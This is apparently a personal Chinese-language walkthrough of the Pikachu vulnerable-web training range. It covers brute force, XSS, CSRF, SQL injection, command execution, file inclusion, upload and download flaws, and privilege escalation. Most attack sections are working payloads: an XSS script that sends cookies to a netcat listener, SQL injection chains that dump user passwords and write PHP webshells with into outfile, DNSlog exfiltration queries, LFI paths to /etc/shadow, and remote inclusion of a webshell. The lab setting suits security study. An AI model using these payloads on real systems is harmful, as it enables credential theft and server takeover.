# pikachu靶场通关

默认后台：

admin

123456

# 暴力破解

> 概述：
>
> “暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。        
>
> ​            理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。            我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。            这里的认证安全策略, 包括：
>
> ​            1.是否要求用户设置复杂的密码；
> ​            2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；
> ​            3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；
> ​            4.是否采用了双因素认证；
> ​            ...
> ​             千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的!
> ​             你可以通过“BurteForce”对应的测试栏目，来进一步的了解该漏洞。        
>
> 从来没有哪个时代的黑客像今天一样热衷于猜解密码  ---奥斯特洛夫斯基



## 基于表单的暴力破解

基于post——开启抓包——burpsuite简单字典测试攻击

1. 尝试登录抓包：

![image-20220119143215549](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/01%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.assets/image-20220119143215549.png)

2. send to intruder——clear——add——clusterbomb

![image-20220119143343792](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/01%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.assets/image-20220119143343792.png)

3. payloads——添加字典

![image-20220119143451066](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/01%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.assets/image-20220119143451066.png)

![image-20220119143522156](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/01%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.assets/image-20220119143522156.png)

4. 测试器intruder——start开始攻击

![image-20220119143627774](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/01%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.assets/image-20220119143627774.png)

5. 发现返回结果长度异常的就是结果。
6. 用户名admin，密码123456



### 攻击方式

**sinper**     一个变量进行攻击（常用）

**battering ram**     设置两个变量，把payload同时给两个变量

**pitchfork**     设置两个变量，按照顺序一一对应进行破解

**cluster bomb**      设置两个变量，穷举所有情况（常用）



## 验证码绕过（on server）

修改phpstudy文件配置php.ini的cookie_lifetime：

![image-20220119141808520](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/01%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.assets/image-20220119141808520.png)

然后会出现一个漏洞——

**验证码的有效时间就是文件配置里设置的值**。



当验证码属于——服务器验证码

查看元素——

![image-20220119142431164](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/01%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.assets/image-20220119142431164.png)



>cookie_life  多久之后session过期（不碰它的情况）
>
>要么burp不放，抓包，暴力破解——验证码段值是需要输入正确的
>
>要么burp放了，手工写入最新的验证码



## 验证码绕过（on client）——js验证码



模拟提交——send to repeater

发现是前端生成的验证码——删除验证码的字段模拟提交发现后端结果是用户名不存在，说明绕过了前端的验证码，其对后端处理没有影响。

**前端判断，后端只负责验证用户名密码，可以考虑把验证码段给删除。**



## token防爆破

查看页面源代码

![image-20220119144103630](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/01%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.assets/image-20220119144103630.png)

>token逻辑：
>
>前端         后端
>
>​                  abc
>
>abc            abc
>
>数据+abc->abc--------->if(abc===abc)-->处理数据
>
>​                   ab1
>
>数据+xxx->ab1---------->False
>
>
>
>>token：
>
>>前端每次请求都要带上token
>
>>防止重复提交
>
>>防止CSRF攻击
>
>>多个服务共享
>>一定程度上可以阻止暴力破解
>
>
>
>>【登录令牌.利用 token 值来判断用户的登录状态.类似于 MD5 加密之后的长字符串.
>
>>用户登录成功之后,在后端(服务器端)会根据用户信息生成一个唯一的值.这个值就是 token 值.】
>
>>**基本使用**
>
>>在服务器端(数据库)会保存这个 token 值,以后利用这个 token 值来检索对应的用户信息,并且判断用户的登录状态.
>
>>用户登录成功之后,服务器会将生成的 token 值返回给 客户端,在客户端也会保存这个 token 值.(一般可以保存在 cookie 中,也可以自己手动确定保存位置(比如偏好设置.)).
>
>>以后客户端在发送新的网络请求的时候,会默认自动附带这个 token 值(作为一个参数传递给服务器.).服务器拿到客户端传递的 token 值跟保存在 数据库中的 token 值做对比,以此来判断用户身份和登录状态.
>
>>**判断登录状态**
>
>>如果客户端没有这个 token 值,意味着没有登录成功过,提示用户登录.
>
>>如果客户端有 token 值,一般会认为登录成功.不需要用户再次登录(输入账号和密码信息).



1. burp抓包---send to intruder---攻击方式采用pitchfork
2. 对password和token打标记
3. password给密码穷举
4. token方面：选择options---设置threads为1---找到Grep Extract---add---refetch response——找到value="token值"，把token值选中，这样burp就会估算每次去哪找token---ok
5. 拉下来，redirections---选择always
6. payloads---2---Recursive grep
7. payload for first request填写你当前数据包的token








# XSS

>XSS（跨站脚本）概述
>
>​                        Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写"CSS"冲突，故又称XSS。一般XSS可以分为如下几种常见类型：
>​                          1.反射性XSS;
>​                          2.存储型XSS;
>​                          3.DOM型XSS;
>
>​                        XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。
>​                        XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。
>​                        形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。
>​                        因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:
>​                         输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
>​                         输出转义：根据输出点的位置对输出到前端的内容进行适当转义;

## 反射型xss、存储型xss

1-3
`<script>alert(1)</script>`

## DOM型xss

4-5
注意看源代码中js刚开始就是'闭合
`javascript:alert(1) `
`#' onclick='alert(1)`

## XSS之盲打

6 使用nc通过xss获取管理员的cookie

```
nc -lvp 4444

<script>var img=document.createElement("img");img.src="http://127.0.0.1:4444/a?"+escape(document.cookie);</script>
```

## XSS之过滤

7
`<sCript>alert(1)</sCript>`
`<img src=x onerror=alert(1)>`

## XSS之htmlspecialchars

8
htmlspecialchars()——把字符转化为html实体（需要svg翻译的东西）——实实在在的东西而不是代码符号

实体编码字符`<svg>`

svg标签会翻译后面的unicode字符

```
<svg><script>alert&#40;1&#41;</script>
```



htmlspecialchars()——实体编码`$ " ' <> #`

```php+HTML
<?php

$a = '<script>alert(1)</script>';
echo htmlspecialchars($a);

?>

访问时发现输出了<script>alert(1)</script>
查看源代码，发现<>确实被实体编码了

程序员编写时会添加参数：
$a = '<script>alert(“1”)</script>';
echo htmlspecialchars($a，ENT_COMPAT);
会发现双引号也被实体编码了
但是：
$a = “<script>alert(‘1’)</script>”;
echo htmlspecialchars($a，ENT_COMPAT);
会发现双引号被实体编码了但是单引号没有被编译
所以有时就会因此产生一些漏洞——单引号逃逸

$a = “<script>alert(‘1’)</script>”;
echo htmlspecialchars($a，ENT_QUOTES);
——单引号和双引号都被实体编码
$a = “<script>alert(‘1’)</script>”;
echo htmlspecialchars($a，ENT_NOQUOTES);
——单引号和双引号都不被实体编码
```



就可以`$ " ' <> #`都输入，查看源代码看它会转义什么



`\#' onclick='alert(1)`

`<a href='' onclick='alert(1)' ''>' onclick='alert(1)''</a>`

## XSS之href输出

9 当所有字符都被转义，就可以利用**JavaScript伪协议**触发js机制：

`javascript:alert(1) `



## XSS之js输出

10
`';alert(1);//`
`';</script><script>alert(1)//`

![image-20220119194434243](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/02%20xss.assets/image-20220119194434243.png)








# CSRF

>CSRF(跨站请求伪造)概述
>
>​                        Cross-site request forgery  简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为"one click"攻击。                         很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。
>​                        这里列举一个场景解释一下，希望能够帮助你理解。
>​                        **场景需求：**
>小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。
>​                        **先看下大白是如何修改自己的密码的：**
>登录---修改会员信息，提交请求---修改成功。
>​                        所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。
>​                    
>
>​                        但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？
>​                        于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：
>​                        【http://www.xxx.com/edit.php?email=xiaohei@88.com&Change=Change】
>​                        于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。
>​                    
>
>​                        **为啥小黑的操作能够实现呢。有如下几个关键点：**
>​                        1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;
>​                        ---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。
>​                        2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;
>​                        ---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。
>​                        ---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。
>​                        当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做：                        欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。
>​                        ---所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。                    
>
>​                        因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：
>​                        --对敏感信息的操作增加安全的token；
>​                        --对敏感信息的操作增加安全的验证码；
>​                        --对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。

## csrf

跨站请求伪造
欺骗用户进行点击，一旦用户点击了，攻击完成

## csrf和xss

csrf是欺骗用户，借助用户权限攻击，但是没有拿到用户权限
xss是直接获取cookie，拿到用户权限

## csrf——get类型，诱导用户点击

登录进去后，点击修改个人信息，抓包，把链接改为：

`http://pikachu.com/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&phonenum=9999&add=usa&email=lili%40pikachu.com&submit=submit`

诱导用户点击，然后就已经不需要用户经过修改流程然后达成修改过程

## csrf——post类型

抓包，获取`sex=girl&phonenum=123&add=usa&email=lili%40pikachu.com&submit=submit`

post提交无法修改参数直接让用户点击。

需要编写相关的能提交参数的含有表单的html，诱导用户去执行这个html：

```php+HTML
http://pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php

sex=girl&phonenum=123&add=usa&email=lili%40pikachu.com&submit=submit

<html>
	<head>
    ...
	</head>

	<form method="POST" action="http://pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php">
	<input type="hidden" name="sex" value="boy"/>
	<input type="hidden" name="phonenum" value="9999"/>
	<input type="hidden" name="add" value="usa"/>
	<input type="hidden" name="email" value="lili%40pikachu.com"/>
	<input type="submit" name="submit" value="点我抽奖">
	</form>
</html>
```

## CSRF token

csrf漏洞主要用来欺骗用户点击，如果使用token可以防御csrf






# SQL inject

>​                           在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。
>​                        **一个严重的SQL注入漏洞，可能会直接导致一家公司破产！**
>​                        SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。                        从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。
>​                    
>
>​                        在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：
>​                        1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；
>​                        2.使用参数化（Parameterized Query 或 Parameterized Statement）；
>​                        3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!                    



## into outfile/load_file

`name=-1' union select 1,load_file('C:/a.txt') --+ `

读取c盘下的a.txt文件
`name=-1' union select 1,load_file('C:/a.txt') into outfile 'C:/phpstudy_pro/WWW/pikachu/vul/sqli/haha.txt' --+` 

读取c盘的a.txt内容到自己目录下的haha.txt

**这个into outfile不具备创建文件的能力!!!!!!**



## 数字型注入——post

**数字型注入相关的sql语句大概是个 `select xxcolumns from xxtable where id=input`的形式。**

数字型——`\`发现没有闭合。

`?id=1 order by 3# `开始。

按简单流程过即可。

post需要抓包

`id=-1 union select 1,2#` 

`id=-1 union select 1,database()#`

`id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#`

`id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema="pikachu" and table_name="users"#`

`id=-1 union select 1,group_concat(username,0x7e,password) from users#`

`id=1 union select load_file('C:/Windows/win.ini'),1 from users#`读文件

`id=1 union select 1,'<?php assert($_POST[1]);?>' into outfile 'C:/phpstudy_pro/WWW/pikachu/vul/sqli/1.php'#`写马



## 字符型注入——get

**字符型注入相关的sql语句大概是个 `select xxcolumns from xxtable where param ='input'`的形式。**

判断闭合

类似于数字型注入——可以直接从url上输入参数——输入字符

`%23==#`

`?name=xxx' order by 2%23`

`?name=xxx' union select 1,2%23`

`?name=xxx' union select database(),2%23`

`?name=xxx' union select 1,group_concat(table_name) from information_schema.tables where table_schema="pikachu"%23`

`?name=xxx' union select 1,group_concat(column_name) from information_schema.columns where table_schema="pikachu" and table_name='users'%23`

`?name=xxx' union select username,password from users%23`

`?name=xxx' union select 1,load_file('C:/Windows/win.ini')%23`  读文件

`?name=x' unxxion select 1,'<?php assert($_POST[2]); ?>' into outfile 'C:/phpstudy_pro/WWW/pikachu/vul/sqli/2.php'%23  `  写马



## 搜索型注入——字符型注入get

**搜索型注入相关的sql语句大概是个 `select xxcolumns from xxtable where param like '%input%'`的形式。本质还是字符型注入，只是闭合不一样。**

找闭合：

`1'\`

——`%'`闭合

`?name=xxx%' order by 3%23`

`?name=xxx%' union select 1,2,3%23`

`?name=xxx%' union select database(),2,3%23`

`?name=xxx%' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="pikachu"%23`

`?name=xxx%' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema="pikachu" and table_name='users'%23`

`?name=xxx%' union select 1,username,password from users%23`

`?name=xxx%' union select 1,2,load_file('C:/Windows/win.ini')%23`  读文件

`?name=x%' unxxion select 1,2,'<?php assert($_POST[2]); ?>' into outfile 'C:/phpstudy_pro/WWW/pikachu/vul/sqli/2.php'%23  `  写马



## xx型注入——字符型注入get

**本质还是字符型注入，只是闭合不是那么简单。**

经过`1'\`测试得到`')`闭合

`?name=xxx') order by 2%23`

`?name=xxx') union select 1,2%23`

`?name=xxx') union select database(),2%23`

`?name=xxx') union select 1,group_concat(table_name) from information_schema.tables where table_schema="pikachu"%23`

`?name=xxx') union select 1,group_concat(column_name) from information_schema.columns where table_schema="pikachu" and table_name='users'%23`

`?name=xxx') union select username,password from users%23`

`?name=xxx') union select 1,load_file('C:/Windows/win.ini')%23`  读文件

`?name=x') unxxion select 1,'<?php assert($_POST[2]); ?>' into outfile 'C:/phpstudy_pro/WWW/pikachu/vul/sqli/2.php'%23  `  写马



## 搜索型注入——小知识：

输入某个参数，搜索出包含该参数的内容。

### MySQL语法

搜索table1内，username列包含n这个关键字的内容：

```
select * from table1 where username like ‘%n%’;
```



## insert/update注入

**insert型注入相关的sql语句大概是个 `INSERT INTO 表名称 VALUES (值1, 值2,....)`或者`INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)` 的形式。**

**update型注入相关的sql语句大概是个 `UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值 `的形式。**



`insert into table1 (username,password,sex,phone,address,live)values('$u','$p','','','','');`

可以尝试使用`'`来闭合让它本身的命令出现混乱：

![image-20220119200340516](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/04%20SQL%20inject.assets/image-20220119200340516.png)

得到结果：

![image-20220119200355226](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/04%20SQL%20inject.assets/image-20220119200355226.png)

一边注册一边burpsuite抓个包。从抓包结果看是post型的，除了submit之外有6个参数。

>1、猜闭合
>
>post data填写：
>
>`username=xixi','111')#&password=666666&sex=&phonenum=&email=&add=&submit=submit`
>
>结果报错了，说列数不对。
>
>其实到这边已经可以基本确认这关闭合是单引号了，但是为了严谨，重新构造如下payload：
>
>`username=xixi','111','222','333','444','555')#&password=666666&sex=&phonenum=&email=&add=&submit=submit`
>
>注册成功，说明闭合确实是单引号。
>
>2、爆库
>
>从上面的操作可以看出来，注册页面是没有sql结果回显的，而且毕竟也不是select语句，也不能采取联合查询注入了。
>
>不过从上一步的操作可以看出来，注册的时候如果sql语句有问题是会报错的，因此报错注入行得通。
>
>payload：`username=xixi' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '&password=666666&sex=&phonenum=&email=&add=&submit=submit`
>
>payload里面是or或者and都可以，注意最后可以不用注释符，把第一个参数的单引号闭合就可以了。
>
>3、爆表
>
>payload：`username= ' or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) or '&password=666666&sex=&phonenum=&email=&add=&submit=submit`
>......
>
>4、爆列
>
>payload：`username= ' or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,31),0x7e),1) or '&password=666666&sex=&phonenum=&email=&add=&submit=submit`
>
>......
>
>5、爆数据：
>
>payload：`username= ' or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,';',password)) from users),1,31),0x7e),1) or '&password=666666&sex=&phonenum=&email=&add=&submit=submit`
>......

可以抓包，send to repeater，使用extractvalue的方式去注入。

`1' and extractvalue(1,concat(0x7e,database())) and '`【#等注释符导致后面的括号无法闭合，所以需要and和单引号去闭合后面的内容】

`1' and extractvalue(1,concat(0x7e,select database())) and '`当使用`select database()`去注入时发现不可取，并且报错显示出密码进行了md5加密

![image-20220119201933159](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/04%20SQL%20inject.assets/image-20220119201933159-16425947738251.png)

然后可以将语句用括号完善继续注入：

`1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema="pikachu"))) and '`

``1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where (table_schema="pikachu" and table_name='users'))) and '``

``1' and extractvalue(1,concat(0x7e,(select substr(group_concat(username,0x7e,password),1) from users))) and '``

......



>（2）update注入
>update操作应该是在修改个人信息的页面
>
>
>
>非常值得注意的是，只有性别，手机，住址，邮箱全都有值的时候，才会执行修改用户信息的操作，否则该操作不执行
>
>
>
>修改信息，submit，burpsuite抓包。也是一个POST报文
>
>
>
>找闭合的步骤省略了，也是先加一个单引号，再加两个单引号，前者报错，后者修改成功，表示闭合是单引号。
>
>
>
>1、爆库  payload：`sex=nv' and updatexml(1,concat(0x7e,(select database()),0x7e),1) #&phonenum=123&add=123&email=123%40123.com&submit=submit`
>
>
>
>2、爆表
>
>没明白为什么一到这一步参数值就不可以有字符串，改成数字是可以的
>
>
>
>payload：`sex=1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) #&phonenum=123&add=123&email=123%40123.com&submit=submit`
>
>
>
>后面差不多，就是改substr的第2个参数
>
>
>
>3、爆列 payload：`sex=1' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,31),0x7e),1) #&phonenum=123&add=123&email=123%40123.com&submit=submit`
>
>
>
>4、爆内容 payload：`sex=1' and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1) #&phonenum=123&add=123&email=123%40123.com&submit=submit`
>
>
>
>5、读文件 payload：`sex=1' and updatexml(1,concat(0x7e,substr((select load_file('c:/windows/win.ini')),1,31),0x7e),1) #&phonenum=123&add=123&email=123%40123.com&submit=submit`



## delete注入

**delete型注入相关的sql语句大概是个** **`DELETE FROM 表名称 WHERE 列名称 = 值` 的形式。**



留言，删除——以id作为标识——get提交。——没有闭合且后面没有需要注释的内容。

当提交不存在的id时，就会出现一些错误：

![image-20220119205040335](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/04%20SQL%20inject.assets/image-20220119205040335.png)

方法一：

直接在url栏进行——传统简单高效的方法：

` and extractvalue(1,concat(0x7e,database()))`



方法二：

也可以使用神器GET提交，注意需要进行url整体编码：

![image-20220119205249566](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/04%20SQL%20inject.assets/image-20220119205249566.png)

![image-20220119205303186](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/04%20SQL%20inject.assets/image-20220119205303186.png)



## http header注入

抓包提交`\`试探闭合方式——`'`

user-agent:

`1' and extractvalue(1,concat(0x7e,database())) and '`



当然accept也可以【因为它也收集了】



## 盲注（base on boolian）

盲注——使用工具——kali的sqlmap

提交一个正确的值，再尝试寻找闭合，得到可以注入的url

因为是在本地搭建的，所以需要去复制url后，将127.0.0.1改为自己本机的ip地址。【且需要修改kali的hosts文件】

使用sqlmap：

方法一：

`sqlmap -u "[目标]" --dbs --skip submit`

```
sqlmap -u "[ip]" --dbs --skip submit

//因为有两个参数而我们只需要测name的一个参数，所以需要用--skip命令让sqlmap不要考虑submit参数。
```

`sqlmap -u "[目标]" --D pikachu --tables --skip submit`

`sqlmap -u "[目标]" --D pikachu -T users --columns --skip submit`

`sqlmap -u "[目标]" --D pikachu --T users --C id,username,password --dump --skip submit`



方法二：

`sqlmap -u "[目标]" --dbs -p name`

```
sqlmap -u "[ip]" --dbs -p name

//因为有两个参数而我们只需要测name的一个参数，所以需要用-p命令让sqlmap只考虑name参数。-p 指定注入点
```



## dnslog注入——盲注

使用函数load_file【加载本地或者页面文件，加载页面文件即是说可以对页面发送请求】，需要点击数据库的配置文件，开启my.ini

在[mysqlld]主体里（可以是主体的结尾处），增加`secure_file_priv=`

重启MySQL服务器。

可以在数据库里做个实验：`select * from table`有回显：

![image-20220119233615432](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/04%20SQL%20inject.assets/image-20220119233615432.png)

如果没有，就去下面的网站

http://www.dnslog.cn/申请一个属于你自己的域名【临时】

nmdi8m.dnslog.cn

是一个指向127.0.0.1的地址，但是对它做DNS请求时，它就会记录下来。

在数据库里做实验：

`select load_file(concat('\\\\',(select username from table1 where id=1),'.nmdi8m.dnslog.cn\\xf1'))`

把id为1的用户名取出并增加到nmdi8m.dnslog.cn的前面。`xf1`处的值每次请求时随便变一下。

`1' and if((select load_file(concat('\\\\',(select database()),'.nmdi8m.dnslog.cn\\xf1'))),1,0) --+`

`1' and if((select load_file(concat('\\\\',(select database()),'.nmdi8m.dnslog.cn\\xf1'))),1,0) --+`

并且域名解析只能在windows上用。



## 盲注（base on time）

方法一：使用dnslog

``1' and if((select load_file(concat('\\\\',(select database()),'.nmdi8m.dnslog.cn\\xf1'))),1,0) --+``

方法二：使用sqlmap

`sqlmap -u "[目标]" --skip 'submit' --technique T --dbs --batch --threads 10 --level 4`





## 宽字节注入

输入值测试抓包发送。

发现没有报错，提示是宽字节注入——`%df`——屏蔽了单引号

`a%df' order by 2 #`

然后使用联合注入即可，但是注意提交的命令里需要单引号的地方要进行hex编码

`id=a%df' union select 1,2#` 

`id=a%df' union select 1,database()#`

`id=a%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#`

`id=a%df' union select 1,group_concat(column_name) from information_schema.columns where table_schema="pikachu" and table_name="users"#`

`id=a%df' union select 1,group_concat(username,0x7e,password) from users#`

`id=a%df' union select load_file('C:/Windows/win.ini'),1 from users#`读文件

`id=a%df' union select 1,'<?php assert($_POST[1]);?>' into outfile 'C:/phpstudy_pro/WWW/pikachu/vul/sqli/1.php'#`写马









# RCE简单命令执行

## 在php里可以作为命令执行的函数：

`system    exec    shell_exec    pcntl_exec    popen proc_popen    passthru`

！！！

## ping

127.0.0.1 | dir



## evel

即会把我们提交的东西直接当做php语法来执行。

——抓包，修改





# File include简单文件包含

文件包含——把它包含的东西当做php代码执行【php会解析】不包含的东西不解析。

## 可以使用文件包含的函数：

`include    include_once     require     require_once`



## local 本地文件包含

### linux中如果出现本地文件包含：

`xxx.php?file=../../../../../../../../etc/passwd`

`xxx.php?file=../../../../../../../../etc/shadow`

可以利用文件包含命令一直退到能读取它们的系统文件



### windows中如果出现文件包含：

`xxx.php?file=../../../../../../../../../../haha.txt`

类似，退很多格，也可以把某文件读取出来

或者通过上传漏洞上传一些一句话木马然后通过这种退格方法把木马文件读取出来，再继续。

如果



### 本地文件包含：

`filename=haha.html`

**如果你文件上传到了一个其他位置，你就需要在当前目录下模拟进入该位置**
`fi_local.php?filename=../../../wiki/haha.html`



## 远程文件包含

`xxx.php?file=http://www.baidu.com`

如果尝试可以，那么按道理就是可以替换成，通过包含我们本地的一句话木马来读取

`xxx.php?file=http://自己ip/a.php[包含了自己的一句话木马的php文件]`

然后提交，用菜刀去连接整个地址







# unsafe filedownload任意文件下载

复制链接地址，去查看到后面提交的参数对应了要下载的内容。

那么尝试看看它能否去下载php文件，如果可以，就说明我们也可以尝试去看它数据库里的一些东西。

因为在本地搭建的靶场方便我们自己看目录，可以退一格去提交我们现有的php文件地址：

`?filename=../down_nba.php`

发现是可以下载服务器上的php文件的。

那么就可以去推断服务器所在的数据库的文件地址从而获取东西。

`?filename=../key.php`










# unsafe fileupload任意文件上传

## client check

直接关掉前端js即可上传php文件。



## mime type

用burpsuite抓包，修改content-type的类型:image/jpeg



## getimagesize

需要做一个图片木马并上传。

使用copy命令即可制作。

或者简易制作a.png：

```
GIF89a
<?php phpinfo() ?>
```

然后使用文件包含去触发它：

```
?filename=../../unsafeupload/uploads/之类的进入文件路径/文件名
```

然后即可



## 小知识：关于找路径

1. f12去找
2. 百度/古戈尔一下这个cms，然后下载下来，本地搭建，然后看到确切位置。







# 越权漏洞 over permission

## 水平越权

用户A----用户B
网站没有使用cookie/session鉴别是不是真的是用户传过来的



尝试登录并查看它具体做了什么。

发现url没有什么变化——post提交。

点击查看个人信息——gee

和t请求。

此时就可以更改url后进入到别的用户里。

### 水平越权漏洞：



你自己可以跳跃到平级的其他人那边去。

### 防御：

可以使用cookie、session、token等方法防御



## 垂直越权

用户A---管理员A
一些只能admin用户使用的程序，没有鉴权，直接可以访问，当其他人知道你这个程序位置的时候，就可以直接访问，代替admin行使权限



### 垂直越权漏洞：

你自己可以跳跃到级别更高的人那边去。



尝试登录普通用户，抓包查看发送内容，没有什么其他需要注意的，放行，查看结果，得到用户名和邮箱等的列表。能得普通用户登录的php文件目录。刷新抓包复制分析。`/op2/op2_login.php`

尝试登录admin用户，查看有什么不一样。

可以刷新抓包分析一下它的与众不同之处，看看有没有什么漏洞。能得到管理员用户登录的php文件目录。复制下来。`/op2/op2_admin.php`

并进入增加用户的页面，刷新抓包复制分析。`/op2/op2_admin_edit.php`



通过分析区别，尝试登录普通用户，抓包，更改phpsession【cookie】、GET请求目录，都改为管理员的相关的，即可进入后台管理中心。








# 反序列化

## 反序列化基础

### 关于php的面向对象

#### 变量赋值

```php+HTML
<?php
//定义一个people类
class people{
	$public $name = 'default name';
}

$ren1 = new people();   //实例化一个类，初始化
$ren1->name = 'xiaoming';     //也可以给这个变量命名，赋值
echo $ren1->name;     //取出类中的变量

?>

得到xiaoming
```

#### 调用类中的方法

```php+HTML
<?php
//定义一个people类
class people{
	public $name = 'default name';
	
	function shuohua(){
		echo 'wo jiao'.$this->name;
	}
}

$ren1 = new people();   //实例化一个类，初始化
$ren1->name = 'xiaoming';     //也可以给这个变量命名，赋值
$ren1->shuohua();   //调用类中的方法


?>


得到wo jiao xiaoming
```

#### 序列化和反序列化

```php+HTML
<?php
//定义一个people类
class people{
	public $name = 'default name';      //类的变量
	
	function shuohua(){
		echo 'wo jiao'.$this->name.'<br/>';    //类的函数，不是变量
	}
}

$ren1 = new people();   //实例化一个类，初始化
$ren1->name = 'xiaoming';     //也可以给这个变量命名，赋值
$ren1->shuohua();   //调用类中的方法

echo serialize($ren1);    //序列化
echo <br/>;

$ren2 = unserialize('O:6:"people":1:{s:4:"name";s:8:"xiaohong";}');     //反序列化
$ren2->shuohua();

?>


得到
wo jiao xiaoming
O:6:"people":1:{s:4:"name";s:8:"xiaoming";}
//object对象，1个变量
wo jiao xiaohong
```

